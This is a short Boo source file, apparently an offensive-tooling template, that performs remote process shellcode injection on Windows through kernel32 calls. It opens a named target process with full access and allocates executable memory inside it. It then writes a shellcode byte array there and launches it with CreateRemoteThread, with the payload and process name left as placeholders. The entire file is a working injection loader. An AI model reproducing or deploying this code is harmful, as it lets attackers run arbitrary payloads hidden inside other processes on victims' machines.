import System
import System.Runtime.InteropServices
import System.Diagnostics

[DllImport("kernel32.dll", SetLastError : true)]
static def OpenProcess(dwDesiredAccess as int, bInheritHandle as bool, dwProcessID as int) as IntPtr:
    pass

[DllImport("kernel32.dll", SetLastError : true, ExactSpelling : true)]
static def VirtualAllocEx(hProcess as IntPtr, lpAddress as IntPtr, dwSize as int, flAllocationType as uint, flProtect as uint) as IntPtr:
     pass

[DllImport("kernel32.dll", SetLastError : true)]
static def WriteProcessMemory(hProcess as IntPtr, lpBaseAddress as IntPtr, lpBuffer as (byte), nSize as int, ref lpNumberOfBytesWritten as IntPtr) as bool:
    pass

[DllImport("kernel32")]
static def CreateRemoteThread(hProcess as IntPtr, lpThreadAttributes as IntPtr, dwStackSize as int, lpStartAddress as IntPtr, lpParameter as IntPtr, dwCreationFlags as uint, ref lpThreadId as int) as IntPtr:
     pass

public static def InjectRemote(sc as (byte), process as string):
    # Process Privileges
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_WRITE = 0x0020
    PROCESS_VM_READ = 0x0010
    PROCESS_ALL = 0x1F0FFF

    # Memory Permissions
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40

    targetProcess = Process.GetProcessesByName(process)[0]
    procHandle = OpenProcess(PROCESS_ALL, false, targetProcess.Id)
    print "procHandle = $procHandle"

    resultPtr = VirtualAllocEx(procHandle, 0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    print "resultPtr = $resultPtr"

    bytesWritten as IntPtr = 0
    resultBool = WriteProcessMemory(procHandle, resultPtr, sc, sc.Length, bytesWritten)
    print "WriteProcessMemory = $resultBool, bytesWritten = $bytesWritten"

    threadid as int = 0
    CreateRemoteThread(procHandle, 0, 0, resultPtr, 0, 0, threadid)
    print "threadId = $threadid"
    print "Injected!"

public static def Main():
    shellcode = array(byte, (BYTES))
    InjectRemote(shellcode, "PROCESS")
